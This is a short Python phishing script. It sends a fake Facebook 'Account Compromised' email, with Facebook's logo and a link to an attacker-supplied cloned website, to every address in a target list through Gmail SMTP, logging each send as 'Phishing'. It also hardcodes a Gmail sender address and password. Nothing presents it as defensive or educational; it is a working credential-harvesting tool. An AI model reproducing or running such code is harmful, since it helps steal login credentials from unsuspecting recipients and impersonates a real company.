import smtplib, ssl
from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


sender = "MarcusSwe8080@gmail.com"
password = "ThisIsThePassword!"


IP = input("Enter IP of cloned website: ")

message = MIMEMultipart("alternative")
message["Subject"] = "Account Compromised"
message["From"] = "Facebook"
text = ""
html = f"""\
<html>
  <body>
    <img width="140" height="140" src="https://facebookbrand.com/wp-content/uploads/2019/04/f_logo_RGB-Hex-Blue_512.png?w=512&h=512" alt="facebook"></img>
    <p>Warning!<br>
       Your Facebook password has been compromised.
       Click here to update it: 
       <a href="{IP}">Facebook</a> 
       <br>
    </p>
  </body>
</html>
"""
part1 = MIMEText(text, "plain")
part2 = MIMEText(html, "html")
message.attach(part1)
message.attach(part2)
context = ssl.create_default_context()

targetEmails = open("emailList.txt")
with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
    server.login(sender, password)
    for email in targetEmails:
        print("Phishing " + email)
        try:
            server.sendmail(sender, email, message.as_string())
        except:
            print("email not found" + email + "....")
        


